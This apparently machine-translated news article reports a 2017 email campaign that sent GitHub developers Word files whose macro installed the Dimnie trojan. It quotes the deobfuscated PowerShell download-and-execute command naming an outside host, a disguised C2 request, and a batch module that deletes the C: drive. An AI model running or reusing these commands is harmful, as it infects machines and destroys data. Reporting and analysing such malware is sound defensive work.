<!doctype html>
<html class="no-js" lang="en">

<head>
  <!-- Global site tag (gtag.js) - Google Analytics -->
  <script async src="https://www.googletagmanager.com/gtag/js?id=UA-134931760-1"></script>
  <script>
    window.dataLayer = window.dataLayer || [];
    function gtag(){dataLayer.push(arguments);}
    gtag('js', new Date());

    gtag('config', 'UA-134931760-1');
  </script>

  <meta charset="utf-8">
  <meta http-equiv="x-ua-compatible" content="ie=edge">
  <title>Someone is trying to hack GitHub users who work under Windows</title>
  <link rel="icon" type="image/x-icon" href="/favicon.ico" />
  <meta name="description" content="Since January 2017, the owners of the GitHub repositories and other free software developers have started receiving emails with malicious attachments....">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  <link rel="stylesheet" href="../../css/main.css">

  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
  <script>window.jQuery || document.write('<script src="../../js/vendors/jquery-3.3.1.min.js"><\/script>')</script>

  <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
  <script>
       (adsbygoogle = window.adsbygoogle || []).push({
            google_ad_client: "ca-pub-6974184241884155",
            enable_page_level_ads: true
       });
  </script>
</head>

<body>
  <!--[if lte IE 9]>
    <p class="browserupgrade">You are using an <strong>outdated</strong> browser. Please <a href="https://browsehappy.com/">upgrade your browser</a> to improve your experience and security.</p>
  <![endif]-->
  <header class="page-header js-page-header">
    <a class="page-header-logo-container" href="https://weekly-geekly.github.io/index.html"></a>
    <div class="page-header-text">Geekly Articles each Day</div>
  </header>
  <nav class="page-headings-container js-page-headings-container"></nav>
  <div class="tools-bar js-tools-bar">
    <!-- <a href="../../search.html" title="Search">üîé</a> -->
    <a class="js-list-of-headings-button" data-state="closed" href="#" title="Headings">üìú</a>
    <a class="js-go-to-top-button" href="#" title="Go to Top">‚¨ÜÔ∏è</a>
    <a class="js-go-to-bottom-button" href="#" title="Go to Bottom">‚¨áÔ∏è</a>
  </div>
  <a href="http://bit.ly/donateToWeeklyGeekly" class="donate-btn">DONATE</a>
  <section class="page js-page"><h1>Someone is trying to hack GitHub users who work under Windows</h1><div class="post__text post__text-html js-mediator-article">  Since January 2017, the owners of the GitHub repositories and other free software developers have <a href="https://hackademix.net/2017/01/27/targeted-email-attack-against-open-source-developers/">started receiving emails</a> with malicious attachments.  In the letter, someone says that he allegedly became interested in the repository and could offer work on another software project: conditions and rates in the attachment. <br><br>  In one of the samples of the malicious distribution, Russian mail servers were recorded in Klujah: <br><br><blockquote>  Return-Path: &lt;ludv.jani-2015@vrg.se&gt; <br>  Received: from unknown (HELO mail.bsme-mos.ru) (95.163.65.54) <br>  by ariel.informaction.com with SMTP;  27 Jan 2017 11:25:22 -0000 <br>  Received: from unknown (HELO o) (zayavka @ bsme-mos.ru @ 94.23.58.202) <br>  by mail.bsme-mos.ru with SMTP;  27 Jan 2017 14:25:17 +0300 <br>  Subject: question <br>  Date: Fri, 27 Jan 2017 12:25:26 +0100 <br>  X-MSMail-Priority: Normal <br>  X-Mailer: Microsoft Windows Live Mail 16.4.3528.331 <br>  X-MimeOLE: Produced By Microsoft MimeOLE V16.4.3528.331 <br>  This is a multi-part message in MIME format. </blockquote><a name="habracut"></a><blockquote>  ------ = _ NextPart_000_25F3_01D27898.7064C4E0 <br>  Content-Type: multipart / alternative; <br>  boundary = "---- = _ NextPart_001_25F4_01D27898.7064C4E0" 
      <br>
        <script async src="//pagead2.googlesyndication.com/pagead/js/adsbygoogle.js"></script>
        <ins class="adsbygoogle"
          style="display:block; text-align:center;"
          data-ad-layout="in-article"
          data-ad-format="fluid"
          data-ad-client="ca-pub-6974184241884155"
          data-ad-slot="8945601208"></ins>
        <script>
          (adsbygoogle = window.adsbygoogle || []).push({});
        </script>
      <br>
      ------ = _ NextPart_001_25F4_01D27898.7064C4E0 <br>  Content-Type: text / plain; <br>  charset = "windows-1251" <br>  Content-Transfer-Encoding: quoted-printable <br><br>  Hey.  I found your software is online.  Can you write the code for my proje = <br>  ct?  Terms of reference attached below. <br>  If you can make.  Answer please. <br><br>  ------ = _ NextPart_001_25F4_01D27898.7064C4E0 <br>  Content-Type: text / html; <br>  charset = "windows-1251" <br>  Content-Transfer-Encoding: quoted-printable <br><br>  (HTML omitted) <br><br>  ------ = _ NextPart_001_25F4_01D27898.7064C4E0-- <br><br>  ------ = _ NextPart_000_25F3_01D27898.7064C4E0 <br>  Content-Type: application / octet-stream; <br>  name = "PROJECT.gz" <br>  Content-Transfer-Encoding: base64 <br>  Content-Disposition: attachment; <br>  filename = "PROJECT.gz" </blockquote><br>  Attached is a file PROJECT.gz.  Despite the extension, it is actually a RAR archive, inside of which is a PROJECT.doc document in MS Word format.  <a href="https://virustotal.com/en/file/6b9af3290723f081e090cd29113c8755696dca88f06d072dd75bf5560ca9408e/analysis/1485524762/">Checking</a> this document in the service of Virustotal predicts shows 6 of 54 anti-virus activations: <br><br>  Arcabit: HEUR.VBA.Trojan.e <br>  Fortinet: WM / Agent.559B! Tr.dldr <br>  NANO-Antivirus: Trojan.Ole2.Vbs-heuristic.druvzi <br>  Qihoo-360: virus.office.gen.65 <br>  Symantec: W97M.Downloader <br>  TrendMicro: W2KM_DLOADER.JCB <br><br>  Although other antiviruses do not find anything, the document clearly carries a malicious load. <br><br>  Developer Giorgio Maone (Giorgio Maone) was the first to announce the receipt of such a document in January of this year.  He even received two similar letters, the previous one was with the attachment 2701.zip (inside the file 2701.doc).  He says that the letter seems to be written by hand, that is, it looks like a targeted attack. <br><br>  The case with Giorgio could be the only one, but it is not.  At the end of March 2017, security experts from Palo Alto Networks published a <a href="http://researchcenter.paloaltonetworks.com/2017/03/unit42-dimnie-hiding-plain-sight/">report</a> that reported on the mass nature of the mailing.  They are aware of several cases where the owners of the repositories with GitHub received such letters. <br><br>  It seems that someone is conducting a targeted attack against programmers, namely against the authors of free software. <br><br>  Palo Alto Networks conducted a detailed analysis of the attack.  They write that in all cases programmers are offered jobs and send the same file in .doc format.  The letter looks something like this (unfortunately, the club is not published). <br><br><blockquote>  Hello, <br><br>  My name is Adam Buchbinder, I saw your GitHub repo and I‚Äôm pretty amazed. <br>  I love you <br>  are a good fit. <br><br>  Please take a look at the app. <br>  Dont hesitate to contact me via email highlighted in the document below. <br><br><br>  Thanks and regards, <br>  Adam. </blockquote><br>  The standard .doc file (SHA256: 6b9af3290723f081e090cd29113c8755696dca88f06d072dd75bf5560ca9408e) contains an embedded macro that runs the PowerShell command to download and execute the file. <br><br><img src="https://habrastorage.org/getpro/geektimes/post_images/8bb/798/4a4/8bb7984a4370f08eea6ad1cf1341b85f.png"><br><br>  After deobfuscation, the command looks like this: <br><br><pre><code class="hljs dos"><span class="hljs-built_in"><span class="hljs-built_in">cmd</span></span>.exe /c "powershell.exe -executionpolicy bypass -noprofile -windowstyle hidden (new-object system.<span class="hljs-built_in"><span class="hljs-built_in">net</span></span>.webclient).downloadfile('hxxp://nicklovegrove.co[.]uk/wp-content/margin2601_onechat_word.exe','<span class="hljs-variable"><span class="hljs-variable">%appdata%</span></span>.exe');<span class="hljs-built_in"><span class="hljs-built_in">start</span></span>-process '<span class="hljs-variable"><span class="hljs-variable">%appdata%</span></span>.exe'"</code> </pre> <br>  Then the binary file is downloaded (SHA256: 3f73b09d9cdd100929061d8590ef0bc01b47999f47fa024f57c28dcd660e7c22). <br><br>  At first glance, all this looks like a standard infection technique, but it is not.  The downloaded binary file was very surprised by the experts.  They found there a copy of the Dimnie trojan, which had been used for several years (presumably by the secret services), but only recently it was discovered.  Special methods of masking traffic and processes allow it to effectively hide from firewalls and antiviruses. <br><br>  The program itself is introduced into the process of the Windows kernel, like its other modules.  Nothing is saved to disk.  Communication with the command service is not only encrypted, but also carried out in the form of innocent DNS queries to Google servers, so as not to arouse suspicion among firewalls.  This is what a typical HTTP GET request to the Google server looks like. <br><br><img src="https://habrastorage.org/getpro/geektimes/post_images/ee1/ac5/b69/ee1ac5b694bb388aa1a09ce182c75329.png"><br><br>  In fact, Google‚Äôs PageRank (toolbarqueries.google.com) specified in the request has not been functioning since 2016 and is now unavailable to the public. <br><br>  From the outside, it looks innocent, just like another DNS query that makes a trojan just before an HTTP GET request. <br><br><img src="https://habrastorage.org/getpro/geektimes/post_images/0e8/b0e/8a6/0e8b0e8a683a706ab1f4a2476f3ac290.png"><br><br>  Two of these requests separately do not cause any suspicion of the firewall or analyst, who studies the traffic in the system.  But the fact is that the Trojan inserts the IP address received from the DNS server into the IP packet header, which looks like an HTTP GET request to the Google server.  This is how Dimnie managed to avoid detection for a long time.  They say it was used in targeted attacks on Russian targets in 2015-2016. <br><br>  In a GET request, the trojan sends an AES 256 ECB key, which is then used to encrypt traffic. <br><br><pre> <code class="hljs pgsql"><span class="hljs-keyword"><span class="hljs-keyword">GET</span></span> http://toolbarqueries.google.com/<span class="hljs-keyword"><span class="hljs-keyword">search</span></span>?sourceid=navclient-ff&amp;features=Rank&amp;client=navclient-auto-ff&amp;ch=fYQAcgUGKQ04yy+<span class="hljs-number"><span class="hljs-number">39</span></span>O6k0IxaeU9Bgw81C6ft2+OPISgD8VPCj5hkCilXUZraPNCm&amp;q=<span class="hljs-keyword"><span class="hljs-keyword">info</span></span>:google.com HTTP/<span class="hljs-number"><span class="hljs-number">1.1</span></span></code> </pre> <br>  Having received the encrypted modules from the control server, the trojan decrypts them on the infected client machine. <br><br>  Further communication with the server is also effectively disguised as normal traffic.  For example, data collected on an infected machine is sent by HTTP POST requests to the gmail.com domain.  At the same time, the data is attached to the image / jpeg header, under the guise of a graphic image, and pre-encrypted with AES 256 in ECB mode. <br><br><img src="https://habrastorage.org/getpro/geektimes/post_images/f36/862/340/f36862340330f3b66a8dc72d5365232e.png"><br><br>  But, as in the case of the previously mentioned download module, the IP address, where the packets are actually sent, is firmly scored in the header. <br><br>  At first, the trojan takes a screenshot of the PC programmer and makes a list of running processes.  All this is sent for study to a remote server. <br><br><img src="https://habrastorage.org/getpro/geektimes/post_images/4c4/673/d39/4c4673d39f77f2178ad6f479c8987fd5.png"><br><br>  About a dozen modules for different purposes work with the Trojan.  Interestingly, one of them is the self-destruct module, which erases all the information on the C: \ drive. <br><br><pre> <code class="hljs dos">@<span class="hljs-built_in"><span class="hljs-built_in">echo</span></span> off <span class="hljs-built_in"><span class="hljs-built_in">Title</span></span> System need to reboot computer! <span class="hljs-built_in"><span class="hljs-built_in">color</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>c <span class="hljs-built_in"><span class="hljs-built_in">Echo</span></span> Auto Starting <span class="hljs-keyword"><span class="hljs-keyword">in</span></span> <span class="hljs-number"><span class="hljs-number">5</span></span> seconds @<span class="hljs-built_in"><span class="hljs-built_in">ping</span></span> <span class="hljs-number"><span class="hljs-number">127</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> -n <span class="hljs-number"><span class="hljs-number">5</span></span> -w <span class="hljs-number"><span class="hljs-number">1000</span></span> &gt; <span class="hljs-built_in"><span class="hljs-built_in">nul</span></span> @<span class="hljs-built_in"><span class="hljs-built_in">ping</span></span> <span class="hljs-number"><span class="hljs-number">127</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> -n <span class="hljs-variable"><span class="hljs-variable">%1%</span></span> -w <span class="hljs-number"><span class="hljs-number">1000</span></span> &gt; <span class="hljs-built_in"><span class="hljs-built_in">nul</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cls</span></span> <span class="hljs-built_in"><span class="hljs-built_in">Color</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>e <span class="hljs-built_in"><span class="hljs-built_in">Echo</span></span> delete disk C <span class="hljs-built_in"><span class="hljs-built_in">del</span></span> C:\\ /s /q @<span class="hljs-built_in"><span class="hljs-built_in">ping</span></span> <span class="hljs-number"><span class="hljs-number">127</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> -n <span class="hljs-number"><span class="hljs-number">3</span></span> -w <span class="hljs-number"><span class="hljs-number">1000</span></span> &gt; <span class="hljs-built_in"><span class="hljs-built_in">nul</span></span> @<span class="hljs-built_in"><span class="hljs-built_in">ping</span></span> <span class="hljs-number"><span class="hljs-number">127</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> -n <span class="hljs-variable"><span class="hljs-variable">%1%</span></span> -w <span class="hljs-number"><span class="hljs-number">1000</span></span> &gt; <span class="hljs-built_in"><span class="hljs-built_in">nul</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cls</span></span> <span class="hljs-built_in"><span class="hljs-built_in">color</span></span> <span class="hljs-number"><span class="hljs-number">0</span></span>c <span class="hljs-built_in"><span class="hljs-built_in">Echo</span></span> Remove directory <span class="hljs-built_in"><span class="hljs-built_in">Rd</span></span> C:\\ /s /q @<span class="hljs-built_in"><span class="hljs-built_in">ping</span></span> <span class="hljs-number"><span class="hljs-number">127</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> -n <span class="hljs-number"><span class="hljs-number">3</span></span> -w <span class="hljs-number"><span class="hljs-number">1000</span></span> &gt; <span class="hljs-built_in"><span class="hljs-built_in">nul</span></span> @<span class="hljs-built_in"><span class="hljs-built_in">ping</span></span> <span class="hljs-number"><span class="hljs-number">127</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">0</span></span>.<span class="hljs-number"><span class="hljs-number">1</span></span> -n <span class="hljs-variable"><span class="hljs-variable">%1%</span></span> -w <span class="hljs-number"><span class="hljs-number">1000</span></span> &gt; <span class="hljs-built_in"><span class="hljs-built_in">nul</span></span> <span class="hljs-built_in"><span class="hljs-built_in">cls</span></span> Msg * \SYSTEM ERROR!HARDDRIVE IS OUT OF ORDER!\;</code> </pre> <br>  Experts believe that Dimnie has been able to hide from detection for several years not only due to intelligent traffic masking and because it does not write anything to disk, but also because this Trojan was used mainly against Russian-speaking targets. <br><br>  It remains unclear who started the campaign against free software developers and why.  Experts from Palo Alto Networks report that they have no information so that a mailing with a malicious attachment comes to someone other than the GitHub developers. <br><br>  But as they are joking in the forums, if you are a developer who works under Windows (the Trojan uses PowerShell) and opens Microsoft Word documents, then you deserve it. </div><p>Source: <a href="https://habr.com/ru/post/357682/">https://habr.com/ru/post/357682/</a></p>
<section class="more-articles-navigation-panel js-more-articles-navigation-panel">
<h4>More articles:</h4>
<nav class="list-of-articles-container js-list-of-articles-container"><ul class="list-of-pages js-list-of-pages">
<li><a href="../357672/index.html">A strange repository appeared on GitHub, similar to the sources of the Opera Presto engine [closed by copyright holders]</a></li>
<li><a href="../357674/index.html">Chrome 57 will actively suppress the work of the background tabs</a></li>
<li><a href="../357676/index.html">Improvements in Chrome and Firefox accelerated page reloading by 28-50%</a></li>
<li><a href="../357678/index.html">Memes and jokes from the CIA archives</a></li>
<li><a href="../357680/index.html">To be included in the register of domestic software, its source code will have to be submitted for evaluation at the Ministry of Communications and Mass Media</a></li>
<li><a href="../357684/index.html">Plugin system on ASP.NET. Idea development</a></li>
<li><a href="../357686/index.html">Deprived of the premium for Russian citizenship, the programmer will receive a payment from Mail.ru</a></li>
<li><a href="../357688/index.html">Client-server step-by-step, from single-threaded to multi-threaded (Client-Server step by step)</a></li>
<li><a href="../357690/index.html">Getting Instagram users by city</a></li>
<li><a href="../357692/index.html">Certificate Store in LibreOffice Office Suite</a></li>
</ul></nav>
</section><br />
<a href="../../allArticles.html"><strong>All Articles</strong></a>
<script src="../../js/main.js"></script>

<!-- Yandex.Metrika counter -->
<script type="text/javascript" >
  (function (d, w, c) {
      (w[c] = w[c] || []).push(function() {
          try {
              w.yaCounter52496797 = new Ya.Metrika({
                  id:52496797,
                  clickmap:true,
                  trackLinks:true,
                  accurateTrackBounce:true,
                  webvisor:true
              });
          } catch(e) { }
      });

      var n = d.getElementsByTagName("script")[0],
          s = d.createElement("script"),
          f = function () { n.parentNode.insertBefore(s, n); };
      s.type = "text/javascript";
      s.async = true;
      s.src = "https://mc.yandex.ru/metrika/watch.js";

      if (w.opera == "[object Opera]") {
          d.addEventListener("DOMContentLoaded", f, false);
      } else { f(); }
  })(document, window, "yandex_metrika_callbacks");
</script>
<noscript><div><img src="https://mc.yandex.ru/watch/52496797" style="position:absolute; left:-9999px;" alt="" /></div></noscript>

<!-- Google Analytics -->
  <script>
    window.ga = function () { ga.q.push(arguments) }; ga.q = []; ga.l = +new Date;
    ga('create', 'UA-134931760-1', 'auto'); ga('send', 'pageview')
  </script>
  <script src="https://www.google-analytics.com/analytics.js" async defer></script>

</section>

  <footer class="page-footer">
    <div class="page-footer-legal-info-container page-footer-element">
      <p>
        Weekly-Geekly | <span class="page-footer-legal-info-year js-page-footer-legal-info-year">2019</span>
      </p>
    </div>
    <div class="page-footer-counters-container page-footer-element">
      <a class="page-footer-counter-clustrmap" href='#'  title='Visit tracker'><img src='https://clustrmaps.com/map_v2.png?cl=698e5a&w=271&t=t&d=6iCFw7uJz0zcOaoxz5k5PcLCJUzv2WG8G5V8M3U6Rc4&co=3a3a3a&ct=ffffff'/></a>
    </div>
  </footer>
</body>

</html>